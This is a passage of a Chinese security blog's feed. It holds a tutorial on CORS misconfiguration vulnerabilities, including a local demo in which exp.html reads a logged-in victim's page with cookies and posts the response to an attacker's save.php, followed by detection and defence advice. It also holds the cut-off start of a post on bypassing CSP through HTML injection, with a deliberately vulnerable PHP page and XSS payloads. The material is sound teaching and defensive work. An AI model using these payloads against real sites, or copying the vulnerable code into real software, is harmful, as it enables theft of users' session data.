      <category term="Web安全基础" scheme="https://www.mi1k7ea.com/categories/Web%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/"/>
    
    
      <category term="Web安全" scheme="https://www.mi1k7ea.com/tags/Web%E5%AE%89%E5%85%A8/"/>
    
      <category term="JSONP" scheme="https://www.mi1k7ea.com/tags/JSONP/"/>
    
  </entry>
  
  <entry>
    <title>CORS跨域漏洞总结</title>
    <link href="https://www.mi1k7ea.com/2019/08/18/CORS%E8%B7%A8%E5%9F%9F%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/"/>
    <id>https://www.mi1k7ea.com/2019/08/18/CORS跨域漏洞总结/</id>
    <published>2019-08-18T08:41:21.000Z</published>
    <updated>2019-09-28T16:01:56.733Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01-CORS相关基本概念"><a href="#0x01-CORS相关基本概念" class="headerlink" title="0x01 CORS相关基本概念"></a>0x01 CORS相关基本概念</h2><h3 id="SOP"><a href="#SOP" class="headerlink" title="SOP"></a>SOP</h3><p>SOP（Same Origin Policy）同源策略，是浏览器的一个安全基石，浏览器的同源策略规定：不同域的客户端脚本在没有明确授权的情况下，不能读写对方的资源。那么何为同源呢，即两个站点需要满足同协议，同域名，同端口这三个条件。</p><p>但随着Web应用的发展，出于一些网络业务的需求，需要实现一些资源的跨域访问，这就造就了一些跨域技术的出现，而下面主要讲下两种最为常见的跨域技术。</p><h3 id="JSONP"><a href="#JSONP" class="headerlink" title="JSONP"></a>JSONP</h3><p>JSONP跨域，就是利用script标签没有跨域限制的特性，使得网页可以从其他来源域动态获取Json数据。JSONP跨域请求一定需要对方的服务器支持才可以。</p><p>JSONP实现流程：</p><ol><li><p>服务端必须支持JSONP，且拥有JSONP跨域接口；</p></li><li><p>浏览器客户端声明一个回调函数，其函数名作为参数值，要传递给跨域请求数据的服务器，函数形参为要获取到的返回目标数据；</p></li><li><p>创建一个script标签，把跨域的API数据接口加载到src属性，并且在这个地址向服务器传递该回调函数名；</p></li><li><p>服务器会将数据返回到浏览器客户端，此时客户端会调用回调函数，对返回的数据进行处理；</p></li></ol><p>至于其他关于JSONP更多的东西这里不去探讨，我们重点看下面的CORS跨域。</p><h3 id="CORS"><a href="#CORS" class="headerlink" title="CORS"></a>CORS</h3><h4 id="原理与工作流程"><a href="#原理与工作流程" class="headerlink" title="原理与工作流程"></a>原理与工作流程</h4><p>CORS（Cross-Origin Resource Sharing）跨源资源共享，是HTML5的一个新特性，其思想是使用自定义的HTTP头部让浏览器与服务器进行沟通，它允许浏览器向跨域服务器发出XMLHttpRequest请求，从而克服AJAX只能同源使用的限制。</p><p>CORS的基本原理是，第三方网站服务器生成访问控制策略，指导用户浏览器放宽 SOP 的限制，实现与指定的目标网站共享数据。</p><p>相比之下，CORS较JSONP更为复杂，JSONP只能用于获取资源（即只读，类似于GET请求），而CORS支持所有类型的HTTP请求，功能完善。</p><p>CORS跨域访问资源示意图：</p><p><img src="/2019/08/18/CORS跨域漏洞总结/1.png" alt=""></p><p>CORS具体工作流程可分为三步，如图所示：</p><p><img src="/2019/08/18/CORS跨域漏洞总结/2.png" alt=""></p><ol><li>请求方脚本从用户浏览器发送跨域请求。浏览器会自动在每个跨域请求中添加Origin头，用于声明请求方的源；</li><li>资源服务器根据请求中Origin头返回访问控制策略(Access-Control-Allow-Origin响应头)，并在其中声明允许读取响应内容的源；</li><li>浏览器检查资源服务器在Access-Control-Allow-Origin头中声明的源，是否与请求方的源相符，如果相符合，则允许请求方脚本读取响应内容，否则不允许；</li></ol><p>在CORS协议中，请求方还可以指示浏览器在跨域请求中是否带credentials（包括Cookie，TLS客户端证书和代理验证信息）。如果跨域请求中带了credentials，那么浏览器会检查资源服务器返回的响应头中Access-Control-Allow-Credentials头是否设置为true，如果是，则允许请求方读取响应内容，否则，不允许。</p><h4 id="基本用法"><a href="#基本用法" class="headerlink" title="基本用法"></a>基本用法</h4><p>当b.com服务器想要与a.com共享资源内容时，它只需要在HTTP响应中添加如下响应头。这个响应头告诉浏览器放宽SOP限制，允许a.com脚本读取响应内容：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Access-Control-Allow-Origin</span>: http://a.com</span><br><span class="line"><span class="attribute">Access-Control-Allow-Credentials</span>: true</span><br></pre></td></tr></table></figure><p>a.com则可以通过以下JavaScript脚本，跨域读取b.com服务器的内容：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> xhr=<span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line">xhr.onreadystatechange = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">    <span class="keyword">if</span> (xhr.readyState == XMLHttpRequest.DONE) &#123; </span><br><span class="line">        alert(xhr.responseText); </span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br><span class="line">xhr.open(“GET“, ”http:<span class="comment">//b.com/api“, true);</span></span><br><span class="line">xhr.withCredentials = <span class="literal">true</span>;</span><br><span class="line">xhr.send();</span><br></pre></td></tr></table></figure><h4 id="几个关键的HTTP头字段"><a href="#几个关键的HTTP头字段" class="headerlink" title="几个关键的HTTP头字段"></a>几个关键的HTTP头字段</h4><p>CORS中关键的几个HTTP头字段如下：</p><ul><li>Access-Control-Allow-Origin：指定哪些外域可以访问本域资源；</li><li>Access-Control-Allow-Credentials：指定浏览器是否将使用请求发送Cookie。仅当设置为true时，才会发送Cookie；</li><li>Access-Control-Allow-Methods：指定可以使用哪些HTTP请求方法（GET、POST、PUT、DELETE等）来访问资源；</li><li>Access-Control-Allow-Headers：指定可以在请求报文中添加的HTTP头字段；</li><li>Access-Control-Max-Age：指定超时时间；</li></ul><h4 id="请求分类"><a href="#请求分类" class="headerlink" title="请求分类"></a>请求分类</h4><p>浏览器将CORS请求分成两类，即简单请求和非简单请求。</p><h5 id="简单请求"><a href="#简单请求" class="headerlink" title="简单请求"></a>简单请求</h5><p>简单请求满足以下条件：</p><ol><li>使用下列方法之一：GET、HEAD、POST</li><li>HTTP的头信息不超出以下几种字段:Accept、Accept-Language、Content-Language、Content-Type（其值仅限于：application/x-www-form-urlencoded、multipart/form-data、text/plain）</li></ol><p>简单请求如图所示，浏览器与服务器之间请求只进行了一次：</p><p><img src="/2019/08/18/CORS跨域漏洞总结/3.png" alt=""></p><h5 id="非简单请求"><a href="#非简单请求" class="headerlink" title="非简单请求"></a>非简单请求</h5><p>简单地说就是简单请求以外的请求都算非简单请求。</p><p>不满足简单请求条件的请求则要先进行预检请求，即使用OPTIONS方法发起一个预检请求到服务器，用于浏览器询问服务器当前网页所在的域名是否在服务器允许访问的白名单中，以及允许使用哪些HTTP方法和字段等。只有得到服务器肯定的相应，浏览器才会发送正式的XHR请求，否则报错。</p><p>关于预检请求，需要注意一下两点：</p><ul><li>预检请求对JS来说是透明的，即JS获取不到预检请求的任何信息；</li><li>预检请求并不是每次请求都发生，服务端设置的Access-Control-Max-Age头部指定了预检请求的有效期，在有效期内的非简单请求不需要再次发送预检请求；</li></ul><p>非简单请求如下所示：</p><p><img src="/2019/08/18/CORS跨域漏洞总结/4.png" alt=""></p><h4 id="一些跨域场景"><a href="#一些跨域场景" class="headerlink" title="一些跨域场景"></a>一些跨域场景</h4><ul><li>比如后端开发完一部分业务代码后，提供接口给前端用，在前后端分离的模式下，前后端的域名是不一致的，此时就会发生跨域访问的问题。</li><li>程序员在本地做开发，本地的文件夹并不是在一个域下面，当一个文件需要发送ajax请求，请求另外一个页面的内容的时候，就会跨域。</li><li>电商网站想通过用户浏览器加载第三方快递网站的物流信息。</li><li>子站域名希望调用主站域名的用户资料接口，并将数据显示出来。</li></ul><h4 id="应用Demo"><a href="#应用Demo" class="headerlink" title="应用Demo"></a>应用Demo</h4><p>编写两个不同域下的文件cors.html和cors.php，cors.html放在本域下、目标是跨域获取cors.php中的内容，cors.php放在其他域下，这里本地测试就直接使用不同IP访问代表不同的域名，而不改hosts文件了。</p><p>cors.html：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>CORS Test<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">'userInfo'</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"https://apps.bdimg.com/libs/jquery/2.1.4/jquery.min.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="actionscript"><span class="keyword">var</span> url = <span class="string">"http://a.com/cors.php"</span>;</span></span><br><span class="line"><span class="javascript">$.get(url, &#123;<span class="attr">a</span>:<span class="string">"getUserInfo"</span>&#125;, <span class="function"><span class="keyword">function</span>(<span class="params">data</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">$(<span class="string">"#userInfo"</span>).text(<span class="string">"Id:"</span> + data.uid + <span class="string">" Name:"</span> + data.name);</span></span><br><span class="line"><span class="actionscript">&#125;, <span class="string">"json"</span>);</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>cors.php，先注释掉CORS跨域必需的相关HTTP头字段：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//header('Access-Control-Allow-Origin: *');</span></span><br><span class="line"><span class="comment">//header('Access-Control-Allow-Credentials: true');</span></span><br><span class="line">$a = !<span class="keyword">empty</span>($_GET[<span class="string">'a'</span>]) ? trim($_GET[<span class="string">'a'</span>]) : <span class="string">''</span>;</span><br><span class="line"><span class="keyword">if</span>($a == <span class="string">'getUserInfo'</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> json_encode(<span class="keyword">array</span>(</span><br><span class="line">                <span class="string">'uid'</span> =&gt; <span class="number">1</span>,</span><br><span class="line">                <span class="string">'name'</span> =&gt; <span class="string">'mi1k7ea'</span>,</span><br><span class="line">        ));</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">''</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>访问本域的cors.html，发现不能成功从外域的cors.php中获取内容，在控制台会报错显示没有ACAO字段：</p><p><img src="/2019/08/18/CORS跨域漏洞总结/5.png" alt=""></p><p>接着我们将cors.php中的那两句注释去掉：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">header(<span class="string">'Access-Control-Allow-Origin: *'</span>);</span><br><span class="line">header(<span class="string">'Access-Control-Allow-Credentials: true'</span>);</span><br></pre></td></tr></table></figure><p>再次访问本域的cors.html，跨域发现成功获取到外域的cors.php中的响应内容并显示到页面中：</p><p><img src="/2019/08/18/CORS跨域漏洞总结/6.png" alt=""></p><h2 id="0x02-CORS跨域漏洞"><a href="#0x02-CORS跨域漏洞" class="headerlink" title="0x02 CORS跨域漏洞"></a>0x02 CORS跨域漏洞</h2><h3 id="漏洞点"><a href="#漏洞点" class="headerlink" title="漏洞点"></a>漏洞点</h3><p>CORS跨域漏洞的本质是服务器配置不当，即Access-Control-Allow-Origin设置为*或是直接取自请求头Origin字段，Access-Control-Allow-Credentials设置为true。</p><h3 id="攻击过程"><a href="#攻击过程" class="headerlink" title="攻击过程"></a>攻击过程</h3><p>整个攻击过程如下：</p><ol><li>用户通过浏览器使用账号密码登录访问正常网站a.com后，此时带有Cookie保持在a.com的登录状态；</li><li>攻击者诱使用户在同一浏览器打开访问恶意站点b.com；</li><li>用户在访问过a.com的同一浏览器打开访问b.com后，b.com后台接收到用户请求并返回恶意代码给浏览器，让浏览器带上Cookie请求访问a.com页面上的敏感信息；</li><li>a.com判断用户Cookie信息后，正常处理该恶意请求，并返回敏感数据；</li><li>攻击者成功通过CORS跨域漏洞获取到用户的敏感信息；</li></ol><h3 id="CORS与CSRF的区别"><a href="#CORS与CSRF的区别" class="headerlink" title="CORS与CSRF的区别"></a>CORS与CSRF的区别</h3><p>一般有CORS漏洞的地方都有CSRF。</p><p>CSRF一般使用form表单提交请求，而浏览器是不会对form表单进行同源拦截的，因为这是无响应的请求，浏览器认为无响应请求是安全的。</p><p>浏览器的同源策略的本质是：一个域名的JS，在未经允许的情况下是不得读取另一个域名的内容，但浏览器并不阻止向另一个域名发送请求。</p><p>相同点：都需要第三方网站；都需要借助Ajax的异步加载过程；一般都需要用户登录目标站点。</p><p>不同点：一般CORS漏洞用于读取受害者的敏感信息，获取请求响应的内容；而CSRF则是诱使受害者点击提交表单来进行某些敏感操作，不用获取请求响应内容。</p><h3 id="Demo"><a href="#Demo" class="headerlink" title="Demo"></a>Demo</h3><p>这里本地进行漏洞模拟利用，当然CORS跨域漏洞分无需Cookie和需Cookie的情况，由于无需Cookie的情景过于简单，于是这里仅演示无需Cookie的情况。</p><p>目标外域站点放置两个文件，login.php和secret.php。</p><p>login.php，用于给用户登录目标站点，此时可以生成对应的Cookie信息：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">setcookie(<span class="string">"SESSIONid"</span>,<span class="string">"this_is_session_id_"</span>.time(),time()+<span class="number">3600</span>,<span class="string">""</span>,<span class="string">""</span>,<span class="number">0</span>);</span><br><span class="line">setcookie(<span class="string">"username"</span>,<span class="string">"Mi1k7ea_"</span>.time(),time()+<span class="number">3600</span>,<span class="string">""</span>,<span class="string">""</span>,<span class="number">0</span>,<span class="number">1</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>secret.php，根据请求报文的Origin字段来设置ACAO字段，ACAC字段设置为true，其中含有phpinfo的敏感信息：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_SERVER[<span class="string">"HTTP_ORIGIN"</span>])) &#123;</span><br><span class="line">    header(<span class="string">'Access-Control-Allow-Origin:'</span>.$_SERVER[<span class="string">"HTTP_ORIGIN"</span>]);</span><br><span class="line">&#125;</span><br><span class="line">header(<span class="string">"Access-Control-Allow-Credentials: true"</span>);</span><br><span class="line">phpinfo();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>在本域下放置两个文件，exp.html和save.php。</p><p>exp.html，：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>Hello I evil page. <span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="actionscript"><span class="function"><span class="keyword">function</span> <span class="title">loadXMLDoc</span><span class="params">()</span></span></span></span><br><span class="line"><span class="undefined">&#123;</span></span><br><span class="line"><span class="actionscript">   <span class="keyword">var</span> xhr1;</span></span><br><span class="line"><span class="actionscript">   <span class="keyword">var</span> xhr2;</span></span><br><span class="line"><span class="javascript">   <span class="keyword">if</span>(<span class="built_in">window</span>.XMLHttpRequest)</span></span><br><span class="line"><span class="undefined">   &#123;</span></span><br><span class="line"><span class="actionscript">       xhr1 = <span class="keyword">new</span> XMLHttpRequest();</span></span><br><span class="line"><span class="actionscript">       xhr2 = <span class="keyword">new</span> XMLHttpRequest();</span></span><br><span class="line"><span class="undefined">   &#125;</span></span><br><span class="line"><span class="actionscript">   <span class="keyword">else</span></span></span><br><span class="line"><span class="undefined">   &#123;</span></span><br><span class="line"><span class="actionscript">       xhr1 = <span class="keyword">new</span> ActiveXObject(<span class="string">"Microsoft.XMLHTTP"</span>);</span></span><br><span class="line"><span class="actionscript">       xhr2= <span class="keyword">new</span> ActiveXObject(<span class="string">"Microsoft.XMLHTTP"</span>);</span></span><br><span class="line"><span class="undefined">   &#125;</span></span><br><span class="line"><span class="actionscript">   xhr1.onreadystatechange=<span class="function"><span class="keyword">function</span><span class="params">()</span></span></span></span><br><span class="line"><span class="undefined">   &#123;</span></span><br><span class="line"><span class="actionscript">       <span class="keyword">if</span>(xhr1.readyState == <span class="number">4</span> &amp;&amp; xhr1.status == <span class="number">200</span>) <span class="comment">//if receive xhr1 response</span></span></span><br><span class="line"><span class="undefined">       &#123;</span></span><br><span class="line"><span class="actionscript">           <span class="keyword">var</span> datas=xhr1.responseText;</span></span><br><span class="line"><span class="actionscript">           xhr2.open(<span class="string">"POST"</span>,<span class="string">"http://127.0.0.1/save.php"</span>,<span class="string">"true"</span>);</span></span><br><span class="line"><span class="actionscript">           xhr2.setRequestHeader(<span class="string">"Content-type"</span>,<span class="string">"application/x-www-form-urlencoded"</span>);</span></span><br><span class="line"><span class="javascript">           xhr2.send(<span class="string">"T1="</span>+<span class="built_in">escape</span>(datas));</span></span><br><span class="line"><span class="undefined">       &#125;</span></span><br><span class="line"><span class="undefined">   &#125;</span></span><br><span class="line"><span class="actionscript">   xhr1.open(<span class="string">"GET"</span>,<span class="string">"http://a.com/secret.php"</span>,<span class="string">"true"</span>) <span class="comment">//request user page.</span></span></span><br><span class="line"><span class="actionscript">   xhr1.withCredentials = <span class="literal">true</span>;        <span class="comment">//request with cookie</span></span></span><br><span class="line"><span class="undefined">   xhr1.send();</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined">loadXMLDoc();</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>save.php，当接收到POST方式传递的T1参数内容时，将内容写入当前Web目录的secret.html文件中：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$myfile = fopen(<span class="string">"secret.html"</span>, <span class="string">"w+"</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">"Unable to open file!"</span>);</span><br><span class="line">$txt = $_POST[<span class="string">'T1'</span>];</span><br><span class="line">fwrite($myfile, $txt);</span><br><span class="line">fclose($myfile);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>下面开始模拟攻击场景。</p><p>首先受害者访问目标外域站点，需要访问login.php进行登录操作，被目标站点设置了Cookie：</p><p><img src="/2019/08/18/CORS跨域漏洞总结/7.png" alt=""></p><p>接着登录成功之后，受害者带着Cookie信息可以正常访问secret.php页面，其中是phpinfo信息，包含用户cookie等敏感信息：</p><p><img src="/2019/08/18/CORS跨域漏洞总结/8.png" alt=""></p><p>在此之后，攻击者向受害者发送一个恶意链接，诱使受害者访问。</p><p>当受害者访问过后，可以看到是会带着当前浏览器对目标外域站点维持着的Cookie信息去请求目标外域站点的secret.php获取内容，并将响应内容POST到攻击者的save.php中进行记录：</p><p><img src="/2019/08/18/CORS跨域漏洞总结/9.png" alt=""></p><p>此时，攻击者只需访问自己本域Web站点根目录下的secret.html即可，当受害者被成功诱使点击之后就会存在该文件并记录下目标外域站点的敏感信息内容：</p><p><img src="/2019/08/18/CORS跨域漏洞总结/10.png" alt=""></p><p>另外有个注意点，如果目标外域站点的secret.php中的ACAO字段设置为*时，浏览器会阻止我们获取响应报文的内容，因为这是浏览器最后一道防线对用户最后的保护。</p><h2 id="0x03-工具"><a href="#0x03-工具" class="headerlink" title="0x03 工具"></a>0x03 工具</h2><p>推荐Github的项目CORScanner：<a href="https://github.com/chenjj/CORScanner" target="_blank" rel="noopener">https://github.com/chenjj/CORScanner</a></p><h2 id="0x04-检测方法"><a href="#0x04-检测方法" class="headerlink" title="0x04 检测方法"></a>0x04 检测方法</h2><h3 id="黑盒"><a href="#黑盒" class="headerlink" title="黑盒"></a>黑盒</h3><p>发送请求报文，然后查看响应报文是否包含Access-Control-Allow-Origin字段，若包含且会*则存在CORS跨域漏洞，或若包含但不为*则修改请求报文头的Origin字段查看ACAO是否改变，若改变则说明存在CORS跨域漏洞。</p><h3 id="白盒"><a href="#白盒" class="headerlink" title="白盒"></a>白盒</h3><p>在源码中搜索设置响应报文头字段的代码，如response.setHeader()，检测是否配置或正确配置Access-Control-Allow-Origin和Access-Control-Allow-Credentials字段。</p><h2 id="0x05-防御方法"><a href="#0x05-防御方法" class="headerlink" title="0x05 防御方法"></a>0x05 防御方法</h2><ul><li>若非必需则不开启CORS；</li><li>若业务必需开启CORS，需严格限制外域白名单，禁止使用通配符*，同时尽量避免使用Access-Control-Allow-Credentials头字段；</li></ul><h2 id="0x06-参考"><a href="#0x06-参考" class="headerlink" title="0x06 参考"></a>0x06 参考</h2><p><a href="https://www.jianjunchen.com/post/cors安全部署最佳实践" target="_blank" rel="noopener">cors安全部署最佳实践</a></p><p><a href="https://www.freebuf.com/articles/web/208672.html" target="_blank" rel="noopener">浅谈跨域威胁与安全</a></p><p><a href="https://bbs.ichunqiu.com/thread-49637-1-1.html" target="_blank" rel="noopener">CORS跨域漏洞的学习</a></p>]]></content>
    
    <summary type="html">
    
      已完结.
    
    </summary>
    
      <category term="Web安全基础" scheme="https://www.mi1k7ea.com/categories/Web%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/"/>
    
    
      <category term="Web安全" scheme="https://www.mi1k7ea.com/tags/Web%E5%AE%89%E5%85%A8/"/>
    
      <category term="CORS" scheme="https://www.mi1k7ea.com/tags/CORS/"/>
    
  </entry>
  
  <entry>
    <title>利用HTML注入劫持标签Bypass CSP</title>
    <link href="https://www.mi1k7ea.com/2019/08/18/%E5%88%A9%E7%94%A8HTML%E6%B3%A8%E5%85%A5%E5%8A%AB%E6%8C%81%E6%A0%87%E7%AD%BEBypass-CSP/"/>
    <id>https://www.mi1k7ea.com/2019/08/18/利用HTML注入劫持标签Bypass-CSP/</id>
    <published>2019-08-18T04:33:42.000Z</published>
    <updated>2019-08-18T05:47:42.276Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01-以往劫持方法的局限性"><a href="#0x01-以往劫持方法的局限性" class="headerlink" title="0x01 以往劫持方法的局限性"></a>0x01 以往劫持方法的局限性</h2><p>在之前的一篇博文<a href="https://www.mi1k7ea.com/2019/02/21/一道绕过CSP的XSS题目/">《一道绕过CSP的XSS题目》</a>中提到了一种绕过CSP的方法，就是利用JS的特性，通过劫持指定id的标签来实现注入的JS代码能执行。但是这种方法的局限性是十分明显的——<strong>即进行劫持注入的地方必须在被劫持的标签的前面</strong>，因为浏览器只会从上至下地解析标签，当页面中存在多个相同id的标签的时，浏览器只会解析第一个标签，如果我们注入的位置在后面，那么将无法成功劫持到该标签。</p><p>看之前的图就知道了：</p><p><img src="/2019/08/18/利用HTML注入劫持标签Bypass-CSP/1.png" alt=""></p><p>我们想劫持的是id为yourname的标签，而我们能够注入的点是id为forminput的标签，可以看到能够注入的标签是在被劫持的标签的前面，所以我们能够成功劫持到id为yourname的标签。</p><h2 id="0x02-HTML标签注入"><a href="#0x02-HTML标签注入" class="headerlink" title="0x02 HTML标签注入"></a>0x02 HTML标签注入</h2><p>如果情况变为了，我们可以注入的点在想被劫持的标签后面，那么我们通过之前的办法还能不能劫持成功？</p><p>我们看个例子：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$nonce = md5(openssl_random_pseudo_bytes(16));</span><br><span class="line">header(&quot;Content-Security-Policy: script-src &apos;nonce-$nonce&apos; &apos;unsafe−eval&apos;; &quot;);</span><br><span class="line">?&gt;</span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;&lt;title&gt;CSP Test&lt;/title&gt;&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;div id=&quot;template_target&quot;&gt;Mi1k7ea&apos;s blog: &lt;/div&gt;</span><br><span class="line">&lt;script type=&quot;application/template&quot; id=&quot;template&quot;&gt;https://www.mi1k7ea.com/&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">Your search is &lt;?php if(isset($_GET[&apos;q&apos;]))&#123;echo $_GET[&apos;q&apos;];&#125; else &#123;echo &apos;empty, but you can input a param called q.&apos;;&#125; ?&gt;</span><br><span class="line"></span><br><span class="line">&lt;script nonce=&lt;?php echo $nonce;?&gt;&gt;</span><br><span class="line">let template = document.getElementById(&apos;template&apos;);</span><br><span class="line">template_target.innerHTML = template.innerText.replace(/&#123;&#123;(.*)&#125;&#125;/g,eval)</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>代码很简单，这里模拟的是模板文件的形式，CSP策略设置为<code>script-src &#39;nonce-xxx&#39; &#39;unsafe−eval&#39;;</code>，正常注入XSS payload是执行不成功的，唯一的可利用点是script标签中的eval、它会执行成功正则匹配到的两对大括号里面的内容，但限定了其执行的位置是id为template的标签。</p><p>显而易见，我们希望能够劫持的是id为template的标签，因为该标签中的内容会被正则匹配到之后调用eval执行JS代码，但是问题也很明显我们输入的注入点就在id为template的script标签的下面，并不能成功劫持到该标签，我们这里可以试试看，我们注入id为template的div标签，其中内容为符合正则匹配的JS弹框代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?q=&lt;div id=&quot;template&quot;&gt;&#123;&#123; alert(&apos;html inject hack&apos;) &#125;&#125;&lt;/div&gt;</span><br></pre></td></tr></table></figure><p><img src="/2019/08/18/利用HTML注入劫持标签Bypass-CSP/2.png" alt=""></p><p>标签是注入了，id也是template，但是是处于id为template的script标签下面，可以看到并没有触发弹框，因为浏览器只解析了排在前面的第一个id为template的标签。</p><p>那么如何去实现劫持呢？——<strong>通过注入HTML标签实现劫持</strong>。</p><p>我们换个标签，将div换成html标签：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span 